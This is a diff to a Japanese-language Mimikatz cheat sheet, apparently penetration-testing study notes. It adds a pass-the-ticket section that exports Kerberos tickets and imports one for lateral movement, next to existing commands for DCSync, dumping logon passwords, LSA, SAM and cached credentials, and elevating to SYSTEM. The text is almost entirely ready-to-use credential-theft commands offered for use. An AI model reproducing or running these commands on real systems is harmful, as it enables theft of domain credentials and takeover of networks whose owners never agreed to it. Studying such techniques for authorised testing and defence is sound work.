@@ -5,6 +5,22 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /all"'
 ```
 
 ```sh
+# キャッシュされている？チケットを利用した横展開
+# チケットの出力
+mimikatz # sekurlsa::tickets /export
+
+# 出力されたチケットの確認
+dir *.kirbi
+# （省略）
+# -a----        12/8/2024   9:32 AM           1577 [0;490626]-0-0-40810000-dave@cifs-web04.kirbi
+# （省略）
+
+# チケット取り込み
+mimikatz # kerberos::ptt [0;47fb8c]-0-0-40810000-dave@cifs-web04.kirbi
+
+```
+
+```sh
 # ワンライナー
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 
@@ -18,6 +34,7 @@ mimikatz # privilege::debug
 # 抽出
 mimikatz # sekurlsa::logonpasswords
 mimikatz # sekurlsa::credman
+
 
 # SYSTEMユーザへのなりすまし
 mimikatz # token::elevate
